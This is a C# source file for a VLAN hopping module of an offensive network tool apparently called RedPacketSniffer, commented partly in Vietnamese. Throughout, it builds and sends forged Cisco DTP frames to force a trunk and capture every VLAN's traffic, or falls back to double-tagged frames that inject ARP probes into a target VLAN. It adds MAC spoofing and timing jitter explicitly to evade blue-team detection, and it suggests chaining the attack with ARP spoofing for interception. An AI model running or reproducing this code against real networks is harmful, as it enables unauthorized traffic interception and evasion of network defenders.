using System.Net;
using System.Net.NetworkInformation;
using RedPacketSniffer.Core.Capture;

namespace RedPacketSniffer.Core.Analysis;

/// <summary>
/// VLAN Hopping module — nhảy VLAN để truy cập traffic ở VLAN khác.
///
/// Chiến lược (tự động fallback):
/// 1. PHASE 1 — DTP Detection: lắng nghe DTP frame từ switch (30s timeout)
///    → Nếu switch gửi DTP → switch bật DTP → chuyển sang DTP Spoofing
///    → Nếu không nhận DTP → switch không bật DTP → chuyển sang Double Tagging
///
/// 2a. DTP Spoofing (Switch Spoofing):
///    - Gửi DTP frame giả với status "Desirable" + type "802.1Q"
///    - Switch ở mode "auto" (default Cisco) sẽ negotiate trunk
///    - Khi trunk lên → attacker nhận traffic TẤT CẢ VLAN trên trunk
///    - Giới hạn: chỉ Cisco switch có DTP, switch khác không hỗ trợ
///
/// 2b. Double Tagging (802.1Q-in-802.1Q):
///    - Gửi frame với 2 lớp VLAN tag: outer = native VLAN, inner = target VLAN
///    - Switch strip outer tag (native VLAN) → forward frame với inner tag sang target VLAN
///    - Giới hạn: ONE-WAY ONLY — response không quay lại attacker
///    - Yêu cầu: biết native VLAN của trunk (thường VLAN 1)
///
/// Kết hợp với ARP Spoofing:
///    VLAN Hopping (nhảy vào target VLAN) → ARP Spoofing (MITM trong VLAN đó)
///
/// Lưu ý: Chỉ dùng cho authorized red team engagement.
/// </summary>
public sealed class VlanHopper : IDisposable
{
    private readonly PacketCaptureEngine _engine;
    private CancellationTokenSource? _cts;
    private Task? _runTask;
    private readonly object _lock = new();

    // DTP detection
    private bool _dtpDetected = false;
    private DateTime? _dtpLastSeen;
    private string _detectedVtpDomain = "";
    private readonly List<DtpFrameInfo> _dtpFrames = new();

    // Config
    private byte[] _attackerMac = Array.Empty<byte>();
    private int _nativeVlan = 1;        // Native VLAN cho double tagging (default: 1)
    private int _targetVlan = 0;        // VLAN mục tiêu
    private int _dtpProbeTimeoutSec = 30; // Thời gian chờ DTP detection
    private int _dtpIntervalMs = 3000;  // Interval gửi DTP frame

    // Anti-detection: timing jitter + MAC spoofing
    private double _jitterPercent = 0.30;     // ±30% randomization on DTP interval
    private readonly Random _rng = new();
    private byte[]? _spoofedMac;              // Custom source MAC (null = real adapter MAC)

    /// <summary>
    /// Effective source MAC — spoofed if set, otherwise real adapter MAC.
    /// Used in DTP frames and double-tagged frames to avoid fingerprinting.
    /// </summary>
    private byte[] EffectiveMac => _spoofedMac ?? _attackerMac;

    // State
    public VlanHopState State { get; private set; } = VlanHopState.Idle;
    public VlanHopMethod ActiveMethod { get; private set; } = VlanHopMethod.None;
    public bool DtpDetected => _dtpDetected;
    public bool TrunkEstablished { get; private set; } = false;
    public int DtpFramesSent { get; private set; }
    public int DoubleTagFramesSent { get; private set; }

    public event Action<string>? OnLog;
    public event Action<VlanHopStatusInfo>? OnStatusChanged;

    /// <summary>
    /// Fired khi phát hiện DTP frame từ switch (passive detection cũng gọi event này)
    /// </summary>
    public event Action<DtpFrameInfo>? OnDtpDetected;

    public VlanHopper(PacketCaptureEngine engine)
    {
        _engine = engine;
    }

    // ============================================================
    // Configuration
    // ============================================================

    /// <summary>
    /// Cấu hình VLAN Hopping.
    /// targetVlan: VLAN mục tiêu muốn nhảy vào
    /// nativeVlan: Native VLAN của trunk (cho double tagging, default 1)
    /// dtpProbeTimeoutSec: thời gian chờ DTP detection trước khi fallback
    /// </summary>
    public void Configure(int targetVlan, int nativeVlan = 1, int dtpProbeTimeoutSec = 30)
    {
        if (targetVlan < 1 || targetVlan > 4094)
            throw new ArgumentException("Target VLAN ID must be 1-4094.");
        if (nativeVlan < 1 || nativeVlan > 4094)
            throw new ArgumentException("Native VLAN ID must be 1-4094.");

        _targetVlan = targetVlan;
        _nativeVlan = nativeVlan;
        _dtpProbeTimeoutSec = Math.Max(10, dtpProbeTimeoutSec);
        _attackerMac = _engine.GetSelectedAdapterMac();

        Log($"Configured: Target VLAN {targetVlan}, Native VLAN {nativeVlan}, DTP probe timeout {_dtpProbeTimeoutSec}s");
    }

    /// <summary>
    /// Set a spoofed source MAC address for DTP and double-tagged frames.
    /// Prevents blue team from identifying attacker NIC via OUI lookup.
    /// Pass null or empty to revert to real adapter MAC.
    /// </summary>
    public void SetSpoofedMac(string? mac)
    {
        if (string.IsNullOrWhiteSpace(mac))
        {
            _spoofedMac = null;
            Log("Spoofed MAC cleared — using real adapter MAC");
            return;
        }

        var parsed = ParseMac(mac);
        if (parsed.All(b => b == 0))
            throw new ArgumentException("Invalid MAC address format. Use AA:BB:CC:DD:EE:FF or AA-BB-CC-DD-EE-FF.");

        _spoofedMac = parsed;
        Log($"Spoofed MAC set: {FormatMac(_spoofedMac)}");
    }

    /// <summary>
    /// Set timing jitter percentage for DTP interval randomization.
    /// Range: 0.0 (no jitter) to 0.50 (±50%). Default: 0.30 (±30%).
    /// </summary>
    public void SetJitter(double percent)
    {
        _jitterPercent = Math.Clamp(percent, 0.0, 0.50);
        Log($"Jitter set to ±{_jitterPercent * 100:F0}%");
    }

    /// <summary>
    /// Compute a jittered delay from a base value.
    /// </summary>
    private int GetJitteredDelay(int baseMs)
    {
        if (_jitterPercent <= 0.0 || baseMs <= 0) return baseMs;
        double range = baseMs * _jitterPercent;
        double offset = (_rng.NextDouble() * 2.0 - 1.0) * range;
        return Math.Max(100, (int)(baseMs + offset)); // Floor at 100ms
    }

    /// <summary>
    /// Generate a random locally-administered unicast MAC address.
    /// </summary>
    public static byte[] GenerateRandomMac()
    {
        var mac = new byte[6];
        Random.Shared.NextBytes(mac);
        mac[0] = (byte)((mac[0] & 0xFC) | 0x02); // Locally administered, unicast
        return mac;
    }

    private static byte[] ParseMac(string mac)
    {
        if (string.IsNullOrEmpty(mac)) return new byte[6];
        var parts = mac.Split(':', '-');
        if (parts.Length != 6) return new byte[6];
        var bytes = new byte[6];
        for (int i = 0; i < 6; i++)
            bytes[i] = Convert.ToByte(parts[i], 16);
        return bytes;
    }

    private static string FormatMac(byte[] mac)
    {
        if (mac == null || mac.Length < 6) return "";
        return $"{mac[0]:X2}:{mac[1]:X2}:{mac[2]:X2}:{mac[3]:X2}:{mac[4]:X2}:{mac[5]:X2}";
    }

    // ============================================================
    // Main workflow: Detect → DTP Spoof hoặc Double Tag
    // ============================================================

    /// <summary>
    /// Bắt đầu VLAN Hopping workflow:
    /// 1. Probe DTP (lắng nghe + gửi DTP frame)
    /// 2. Nếu switch respond → DTP Spoofing (negotiate trunk)
    /// 3. Nếu không → fallback Double Tagging
    /// </summary>
    public void Start()
    {
        if (State != VlanHopState.Idle)
            throw new InvalidOperationException($"Already in state {State}, cannot start.");
        if (_targetVlan == 0)
            throw new InvalidOperationException("Not configured. Call Configure() first.");

        _attackerMac = _engine.GetSelectedAdapterMac();
        DtpFramesSent = 0;
        DoubleTagFramesSent = 0;
        TrunkEstablished = false;
        _dtpDetected = false;

        // Cảnh báo Wi-Fi: AP ở client mode strip 802.1Q tag và không forward
        // DTP multicast — DTP spoofing + double tagging praktisch chỉ chạy trên Ethernet có dây.
        if (IsSniffingOnWifi())
            Log("WARNING: the sniffing NIC is Wi-Fi — DTP/double tagging almost NEVER works " +
                "over Wi-Fi client mode (the AP strips VLAN tags). Use wired Ethernet plugged directly into the switch.");

        _cts = new CancellationTokenSource();
        _runTask = Task.Run(() => RunWorkflow(_cts.Token));

        State = VlanHopState.ProbingDtp;
        ActiveMethod = VlanHopMethod.None;
        NotifyStatus();
        Log($"VLAN Hopping started (src MAC: {FormatMac(EffectiveMac)}, jitter: ±{_jitterPercent * 100:F0}%) — probing for DTP...");
    }

    /// <summary>
    /// Dừng VLAN Hopping
    /// </summary>
    public async Task StopAsync()
    {
        if (State == VlanHopState.Idle) return;

        _cts?.Cancel();
        if (_runTask != null)
        {
            try { await _runTask; }
            catch (OperationCanceledException) { }
        }

        _cts?.Dispose();
        _cts = null;
        _runTask = null;
        State = VlanHopState.Idle;
        ActiveMethod = VlanHopMethod.None;
        TrunkEstablished = false;
        NotifyStatus();
        Log("VLAN Hopping stopped");
    }

    /// <summary>
    /// Phân tích packet đến — detect DTP frame từ switch
    /// Gọi method này từ capture loop cho mỗi packet
    /// </summary>
    public void AnalyzePacket(CapturedPacket packet)
    {
        // DTP detection: check destination MAC = 01:00:0C:CC:CC:CC
        if (packet.DestMac == "01:00:0C:CC:CC:CC" && IsDtpFrame(packet))
        {
            lock (_lock)
            {
                _dtpDetected = true;
                _dtpLastSeen = DateTime.UtcNow;

                var info = new DtpFrameInfo
                {
                    SourceMac = packet.SourceMac,
                    Timestamp = DateTime.UtcNow,
                    VtpDomain = _detectedVtpDomain,
                    RawLength = packet.Length
                };
                _dtpFrames.Add(info);
                OnDtpDetected?.Invoke(info);
            }

            Log($"DTP frame detected from {packet.SourceMac} — switch has DTP enabled!");
        }
    }

    // ============================================================
    // Workflow logic
    // ============================================================

    private async Task RunWorkflow(CancellationToken ct)
    {
        // === PHASE 1: DTP Probing ===
        // Gửi DTP frame + lắng nghe response song song
        Log($"Phase 1: DTP probing ({_dtpProbeTimeoutSec}s timeout)...");
        Log("  Listening for DTP frames from switch...");
        Log("  Sending DTP Desirable frames to trigger negotiation...");

        var probeDeadline = DateTime.UtcNow.AddSeconds(_dtpProbeTimeoutSec);
        int probesSent = 0;

        while (DateTime.UtcNow < probeDeadline && !ct.IsCancellationRequested)
        {
            // Gửi DTP Desirable frame mỗi 3 giây
            try
            {
                byte[] dtpFrame = BuildDtpDesirableFrame();
                _engine.SendRawPacket(dtpFrame);
                probesSent++;
                DtpFramesSent++;
            }
            catch (Exception ex)
            {
                Log($"DTP send error: {ex.Message}");
            }

            // Check xem switch đã respond chưa
            if (_dtpDetected)
            {
                Log("Switch responded to DTP — DTP is ENABLED!");
                Log("Switching to DTP Spoofing mode...");

                State = VlanHopState.DtpSpoofing;
                ActiveMethod = VlanHopMethod.DtpSpoofing;
                NotifyStatus();

                await RunDtpSpoofing(ct);
                return;
            }

            // Jittered delay between DTP probes to avoid periodic detection pattern
            int probeDelay = GetJitteredDelay(_dtpIntervalMs);
            try { await Task.Delay(probeDelay, ct); }
            catch (OperationCanceledException) { return; }
        }

        if (ct.IsCancellationRequested) return;

        // === PHASE 2: Fallback to Double Tagging ===
        Log($"DTP probe timeout — no DTP response after {probesSent} frames.");
        Log("Switch likely has DTP disabled or is non-Cisco.");
        Log($"Falling back to Double Tagging (native VLAN {_nativeVlan} → target VLAN {_targetVlan})...");
        Log("⚠ Double Tagging is ONE-WAY ONLY — responses won't come back to attacker.");

        State = VlanHopState.DoubleTagging;
        ActiveMethod = VlanHopMethod.DoubleTagging;
        NotifyStatus();

        await RunDoubleTagging(ct);
    }

    /// <summary>
    /// DTP Spoofing loop — liên tục gửi DTP Desirable frame để duy trì trunk.
    /// Trunk sẽ timeout nếu ngừng gửi, nên phải gửi liên tục.
    /// </summary>
    private async Task RunDtpSpoofing(CancellationToken ct)
    {
        TrunkEstablished = true;
        NotifyStatus();

        Log("Trunk negotiation in progress...");
        Log("Sending DTP Desirable frames continuously to maintain trunk...");
        Log($"Attacker should now receive traffic for ALL VLANs on this trunk.");
        Log("Tip: Combine with ARP Spoofing inside the target VLAN for MITM.");

        while (!ct.IsCancellationRequested)
        {
            try
            {
                byte[] dtpFrame = BuildDtpDesirableFrame();
                _engine.SendRawPacket(dtpFrame);
                DtpFramesSent++;
            }
            catch (Exception ex)
            {
                Log($"DTP send error: {ex.Message}");
            }

            // Jittered delay to maintain trunk without predictable timing
            int maintainDelay = GetJitteredDelay(_dtpIntervalMs);
            try { await Task.Delay(maintainDelay, ct); }
            catch (OperationCanceledException) { break; }
        }

        TrunkEstablished = false;
    }

    /// <summary>
    /// Double Tagging mode — sẵn sàng gửi frame double-tagged.
    /// Không tự gửi liên tục vì double tagging cần payload cụ thể.
    /// Ở đây duy trì state và cung cấp API SendDoubleTagged() cho caller.
    /// </summary>
    private async Task RunDoubleTagging(CancellationToken ct)
    {
        Log("Double Tagging mode active.");
        Log("Use SendDoubleTaggedFrame() to send crafted frames to target VLAN.");
        Log("Or use SendDoubleTaggedArp() to send ARP probes to target VLAN.");

        // Gửi một loạt ARP probe vào target VLAN để khám phá hosts
        Log($"Sending ARP broadcast probes to VLAN {_targetVlan}...");
        for (int i = 0; i < 3 && !ct.IsCancellationRequested; i++)
        {
            try
            {
                byte[] frame = BuildDoubleTaggedArpBroadcast();
                _engine.SendRawPacket(frame);
                DoubleTagFramesSent++;
            }
            catch (Exception ex)
            {
                Log($"Double tag send error: {ex.Message}");
            }

            // Jittered delay between ARP probes (base 1000ms)
            int probeDelay = GetJitteredDelay(1000);
            try { await Task.Delay(probeDelay, ct); }
            catch (OperationCanceledException) { break; }
        }

        // Giữ state active cho đến khi stop
        while (!ct.IsCancellationRequested)
        {
            try { await Task.Delay(5000, ct); }
            catch (OperationCanceledException) { break; }
        }
    }

    // ============================================================
    // Public API — gửi frame thủ công trong Double Tagging mode
    // ============================================================

    /// <summary>
    /// Gửi raw Ethernet frame với double 802.1Q tag vào target VLAN.
    /// payload: nội dung bên trong (bắt đầu từ EtherType, không gồm Ethernet header)
    /// Chỉ dùng khi đang ở DoubleTagging mode.
    /// </summary>
    public bool SendDoubleTaggedFrame(byte[] innerPayload)
    {
        if (ActiveMethod != VlanHopMethod.DoubleTagging && ActiveMethod != VlanHopMethod.DtpSpoofing)
            throw new InvalidOperationException("Not in double tagging mode.");

        byte[] frame = BuildDoubleTaggedFrame(innerPayload);
        bool sent = _engine.SendRawPacket(frame);
        if (sent) DoubleTagFramesSent++;
        return sent;
    }

    /// <summary>
    /// Gửi ARP request broadcast vào target VLAN qua double tagging.
    /// targetIp: IP muốn resolve trong target VLAN
    /// </summary>
    public bool SendDoubleTaggedArpRequest(string targetIp)
    {
        byte[] frame = BuildDoubleTaggedArpRequest(targetIp);
        bool sent = _engine.SendRawPacket(frame);
        if (sent) DoubleTagFramesSent++;
        return sent;
    }

    /// <summary>
    /// Lấy trạng thái hiện tại
    /// </summary>
    public VlanHopStatusInfo GetStatus()
    {
        lock (_lock)
        {
            return new VlanHopStatusInfo
            {
                State = State.ToString(),
                ActiveMethod = ActiveMethod.ToString(),
                TargetVlan = _targetVlan,
                NativeVlan = _nativeVlan,
                DtpDetected = _dtpDetected,
                DtpLastSeen = _dtpLastSeen,
                TrunkEstablished = TrunkEstablished,
                DtpFramesSent = DtpFramesSent,
                DoubleTagFramesSent = DoubleTagFramesSent,
                DetectedVtpDomain = _detectedVtpDomain,
                DtpFramesReceived = _dtpFrames.Count,
                EffectiveMac = FormatMac(EffectiveMac),
                UsingSpoofedMac = _spoofedMac != null,
                JitterPercent = _jitterPercent
            };
        }
    }

    // ============================================================
    // DTP Frame Builder
    // ============================================================

    // DTP multicast MAC — Cisco proprietary
    private static readonly byte[] DTP_MULTICAST_MAC = { 0x01, 0x00, 0x0C, 0xCC, 0xCC, 0xCC };

    // Cisco SNAP OUI
    private static readonly byte[] CISCO_OUI = { 0x00, 0x00, 0x0C };

    // DTP Protocol ID under SNAP
    private const ushort DTP_PID = 0x2004;

    // DTP TLV types
    private const ushort DTP_TLV_DOMAIN = 0x0001;
    private const ushort DTP_TLV_STATUS = 0x0002;
    private const ushort DTP_TLV_TYPE = 0x0003;
    private const ushort DTP_TLV_NEIGHBOR = 0x0004;

    /// <summary>
    /// Build DTP frame với status "Desirable" + trunk type "802.1Q"
    ///
    /// Frame layout:
    ///   Ethernet: dst=01:00:0C:CC:CC:CC, src=attacker, length
    ///   LLC: DSAP=0xAA, SSAP=0xAA, Control=0x03 (SNAP)
    ///   SNAP: OUI=00:00:0C (Cisco), PID=0x2004 (DTP)
    ///   DTP: Version=0x01 + TLVs
    ///
    /// TLVs:
    ///   Domain (0x0001): VTP domain (empty = matches any)
    ///   Status (0x0002): 0x03 = Access/Off, 0x04 = Auto, 0x81 = On, 0xA5 = Desirable
    ///                    Encoding: bits [7:5]=trunk state, [4:2]=admin, [1:0]=capability
    ///                    0xA5 = 10100101 → desirable + supports both ISL and 802.1Q
    ///   Type (0x0003):   Trunk encapsulation — 0xA5 = negotiate, prefers 802.1Q
    ///   Neighbor (0x0004): Sender MAC
    /// </summary>
    private byte[] BuildDtpDesirableFrame()
    {
        byte[] srcMac = EffectiveMac;

        // DTP payload: version(1) + TLVs
        var dtpPayload = new List<byte>();

        // DTP Version
        dtpPayload.Add(0x01);

        // TLV: Domain (empty — matches any VTP domain)
        AddTlv(dtpPayload, DTP_TLV_DOMAIN, Array.Empty<byte>());

        // TLV: Status = 0xA5 (Desirable, supports ISL + 802.1Q)
        // Bit breakdown:
        //   [7:6] = 10 (Trunk operational status: on)
        //   [5]   = 1  (Administrative trunk state: desirable)
        //   [4:3] = 00 (Reserved)
        //   [2]   = 1  (802.1Q capable)
        //   [1:0] = 01 (ISL capable)
        // → 0xA5
        AddTlv(dtpPayload, DTP_TLV_STATUS, new byte[] { 0x00, 0x00, 0x00, 0xA5 });

        // TLV: Type = 0xA5 (negotiate, 802.1Q preferred)
        AddTlv(dtpPayload, DTP_TLV_TYPE, new byte[] { 0x00, 0x00, 0x00, 0xA5 });

        // TLV: Neighbor = effective MAC (spoofed or real)
        AddTlv(dtpPayload, DTP_TLV_NEIGHBOR, srcMac);

        // Build complete Ethernet + LLC/SNAP + DTP frame
        var frame = new List<byte>();

        // Ethernet header (802.3 format — length, not EtherType)
        frame.AddRange(DTP_MULTICAST_MAC);    // Dst MAC
        frame.AddRange(srcMac);               // Src MAC (effective — spoofed or real)

        int llcSnapLen = 3 + 5 + dtpPayload.Count; // LLC(3) + SNAP(5) + DTP
        frame.Add((byte)(llcSnapLen >> 8));
        frame.Add((byte)(llcSnapLen & 0xFF));

        // LLC header (SNAP)
        frame.Add(0xAA); // DSAP
        frame.Add(0xAA); // SSAP
        frame.Add(0x03); // Control (UI — Unnumbered Information)

        // SNAP header
        frame.AddRange(CISCO_OUI);                        // OUI = Cisco
        frame.Add((byte)(DTP_PID >> 8));                  // PID high
        frame.Add((byte)(DTP_PID & 0xFF));                // PID low

        // DTP payload
        frame.AddRange(dtpPayload);

        // Pad to minimum 60 bytes (Ethernet minimum frame size)
        while (frame.Count < 60)
            frame.Add(0x00);

        return frame.ToArray();
    }

    private static void AddTlv(List<byte> buffer, ushort type, byte[] value)
    {
        ushort length = (ushort)(4 + value.Length); // type(2) + length(2) + value
        buffer.Add((byte)(type >> 8));
        buffer.Add((byte)(type & 0xFF));
        buffer.Add((byte)(length >> 8));
        buffer.Add((byte)(length & 0xFF));
        buffer.AddRange(value);
    }

    /// <summary>
    /// Check xem một packet có phải DTP frame không.
    /// DTP dùng LLC/SNAP encapsulation với Cisco OUI (00:00:0C) + PID 0x2004.
    /// </summary>
    private bool IsDtpFrame(CapturedPacket packet)
    {
        // Heuristic: check application protocol hoặc info field
        // PacketParser có thể đã detect CDP/DTP/VTP dựa trên SNAP header
        if (packet.ApplicationProtocol == "DTP") return true;

        // Fallback: check raw data nếu parser chưa detect
        // DTP dst MAC = 01:00:0C:CC:CC:CC (đã check bên ngoài)
        // Info field có thể chứa hint
        if (packet.Info?.Contains("DTP", StringComparison.OrdinalIgnoreCase) == true)
            return true;

        // Check EtherType/Length field — DTP dùng 802.3 (length < 1536)
        // và LLC/SNAP với OUI=00:00:0C, PID=0x2004
        // Nếu parser đã identify đúng thì ApplicationProtocol đã set
        return false;
    }

    // ============================================================
    // Double Tagging Frame Builder
    // ============================================================

    /// <summary>
    /// Build frame với 2 lớp 802.1Q VLAN tag (QinQ).
    ///
    /// Layout:
    ///   [Dst MAC][Src MAC][0x8100][Outer VLAN Tag][0x8100][Inner VLAN Tag][Original EtherType + Payload]
    ///
    /// Outer tag = native VLAN → switch strip tag này (vì trùng native VLAN)
    /// Inner tag = target VLAN → switch forward frame vào VLAN này
    ///
    /// innerPayload: bắt đầu từ EtherType (2 bytes) + IP/ARP payload
    /// </summary>
    private byte[] BuildDoubleTaggedFrame(byte[] innerPayload)
    {
        var frame = new List<byte>();

        // Ethernet dst + src
        frame.AddRange(new byte[] { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF }); // Broadcast
        frame.AddRange(EffectiveMac); // Spoofed or real MAC

        // Outer 802.1Q tag (native VLAN)
        frame.Add(0x81); frame.Add(0x00);                     // TPID = 802.1Q
        ushort outerTci = (ushort)(_nativeVlan & 0x0FFF);     // PRI=0, DEI=0, VID=native
        frame.Add((byte)(outerTci >> 8));
        frame.Add((byte)(outerTci & 0xFF));

        // Inner 802.1Q tag (target VLAN)
        frame.Add(0x81); frame.Add(0x00);                     // TPID = 802.1Q
        ushort innerTci = (ushort)(_targetVlan & 0x0FFF);     // PRI=0, DEI=0, VID=target
        frame.Add((byte)(innerTci >> 8));
        frame.Add((byte)(innerTci & 0xFF));

        // Inner payload (EtherType + data)
        frame.AddRange(innerPayload);

        // Pad to 60 bytes minimum
        while (frame.Count < 60)
            frame.Add(0x00);

        return frame.ToArray();
    }

    /// <summary>
    /// Build double-tagged ARP broadcast — gửi ARP request broadcast vào target VLAN.
    /// Dùng để khám phá hosts trong VLAN mục tiêu.
    /// </summary>
    private byte[] BuildDoubleTaggedArpBroadcast()
    {
        // ARP Request: "Who has 0.0.0.0? Tell (attacker)"
        // Broadcast để khám phá — bất kỳ host nào trong target VLAN reply sẽ bị capture
        // (nếu switch mirror hoặc attacker đã có trunk)
        var arpPayload = BuildArpPayload(
            senderMac: EffectiveMac,
            senderIp: 0,                    // 0.0.0.0 — probe
            targetMac: new byte[6],         // 00:00:00:00:00:00
            targetIp: 0xFFFFFFFF,           // 255.255.255.255 — broadcast
            opcode: 1                       // ARP Request
        );

        var innerPayload = new List<byte>();
        innerPayload.Add(0x08); innerPayload.Add(0x06); // EtherType = ARP
        innerPayload.AddRange(arpPayload);

        return BuildDoubleTaggedFrame(innerPayload.ToArray());
    }

    /// <summary>
    /// Build double-tagged ARP request cho một IP cụ thể trong target VLAN
    /// </summary>
    private byte[] BuildDoubleTaggedArpRequest(string targetIp)
    {
        uint targetIpUint = IpToUint(targetIp);
        byte[] srcMac = EffectiveMac;

        var arpPayload = BuildArpPayload(
            senderMac: srcMac,
            senderIp: 0,                    // 0.0.0.0 — anonymous probe
            targetMac: new byte[6],
            targetIp: targetIpUint,
            opcode: 1                       // ARP Request
        );

        // Dst MAC = broadcast cho ARP request
        var frame = new List<byte>();
        frame.AddRange(new byte[] { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF });
        frame.AddRange(srcMac); // Spoofed or real MAC

        // Outer 802.1Q tag (native VLAN)
        frame.Add(0x81); frame.Add(0x00);
        ushort outerTci = (ushort)(_nativeVlan & 0x0FFF);
        frame.Add((byte)(outerTci >> 8));
        frame.Add((byte)(outerTci & 0xFF));

        // Inner 802.1Q tag (target VLAN)
        frame.Add(0x81); frame.Add(0x00);
        ushort innerTci = (ushort)(_targetVlan & 0x0FFF);
        frame.Add((byte)(innerTci >> 8));
        frame.Add((byte)(innerTci & 0xFF));

        // EtherType + ARP
        frame.Add(0x08); frame.Add(0x06);
        frame.AddRange(arpPayload);

        while (frame.Count < 60)
            frame.Add(0x00);

        return frame.ToArray();
    }

    /// <summary>
    /// Build ARP payload (không gồm Ethernet header)
    /// </summary>
    private static byte[] BuildArpPayload(byte[] senderMac, uint senderIp, byte[] targetMac, uint targetIp, ushort opcode)
    {
        var arp = new byte[28];

        // Hardware type = Ethernet (1)
        arp[0] = 0x00; arp[1] = 0x01;
        // Protocol type = IPv4 (0x0800)
        arp[2] = 0x08; arp[3] = 0x00;
        // Hardware size = 6, Protocol size = 4
        arp[4] = 0x06; arp[5] = 0x04;
        // Opcode
        arp[6] = (byte)(opcode >> 8);
        arp[7] = (byte)(opcode & 0xFF);

        // Sender MAC + IP
        Array.Copy(senderMac, 0, arp, 8, 6);
        arp[14] = (byte)(senderIp & 0xFF);
        arp[15] = (byte)((senderIp >> 8) & 0xFF);
        arp[16] = (byte)((senderIp >> 16) & 0xFF);
        arp[17] = (byte)((senderIp >> 24) & 0xFF);

        // Target MAC + IP
        Array.Copy(targetMac, 0, arp, 18, 6);
        arp[24] = (byte)(targetIp & 0xFF);
        arp[25] = (byte)((targetIp >> 8) & 0xFF);
        arp[26] = (byte)((targetIp >> 16) & 0xFF);
        arp[27] = (byte)((targetIp >> 24) & 0xFF);

        return arp;
    }

    // ============================================================
    // Helpers
    // ============================================================

    private static uint IpToUint(string ip)
    {
        var bytes = IPAddress.Parse(ip).GetAddressBytes();
        return BitConverter.ToUInt32(bytes, 0);
    }

    private void Log(string message) => OnLog?.Invoke(message);

    /// <summary>
    /// Kiểm tra card đang sniff có phải Wi-Fi không (khớp MAC với adapter đã chọn).
    /// </summary>
    private bool IsSniffingOnWifi()
    {
        try
        {
            byte[] selMac = _engine.GetSelectedAdapterMac();
            if (selMac.Length != 6) return false;
            foreach (var nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.OperationalStatus != OperationalStatus.Up) continue;
                if (nic.NetworkInterfaceType == NetworkInterfaceType.Loopback) continue;
                try
                {
                    byte[] mac = nic.GetPhysicalAddress().GetAddressBytes();
                    if (mac.Length == 6 && mac.SequenceEqual(selMac))
                        return nic.NetworkInterfaceType == NetworkInterfaceType.Wireless80211;
                }
                catch { /* bỏ qua NIC lỗi đọc MAC */ }
            }
        }
        catch { /* chưa chọn adapter */ }
        return false;
    }

    private void NotifyStatus() => OnStatusChanged?.Invoke(GetStatus());

    public void Dispose()
    {
        if (State != VlanHopState.Idle)
        {
            _cts?.Cancel();
            _runTask?.Wait(TimeSpan.FromSeconds(3));
        }
        _cts?.Dispose();
    }
}

// ============================================================
// Enums & Data Models
// ============================================================

public enum VlanHopState
{
    Idle,
    ProbingDtp,     // Đang dò DTP
    DtpSpoofing,   // DTP detected → đang spoof trunk
    DoubleTagging   // DTP không có → đang dùng double tagging
}

public enum VlanHopMethod
{
    None,
    DtpSpoofing,
    DoubleTagging
}

public class DtpFrameInfo
{
    public string SourceMac { get; init; } = "";
    public DateTime Timestamp { get; init; }
    public string VtpDomain { get; init; } = "";
    public int RawLength { get; init; }
}

public class VlanHopStatusInfo
{
    public string State { get; init; } = "";
    public string ActiveMethod { get; init; } = "";
    public int TargetVlan { get; init; }
    public int NativeVlan { get; init; }
    public bool DtpDetected { get; init; }
    public DateTime? DtpLastSeen { get; init; }
    public bool TrunkEstablished { get; init; }
    public int DtpFramesSent { get; init; }
    public int DoubleTagFramesSent { get; init; }
    public string DetectedVtpDomain { get; init; } = "";
    public int DtpFramesReceived { get; init; }
    public string EffectiveMac { get; init; } = "";   // MAC actually used in frames
    public bool UsingSpoofedMac { get; init; }
    public double JitterPercent { get; init; }
}
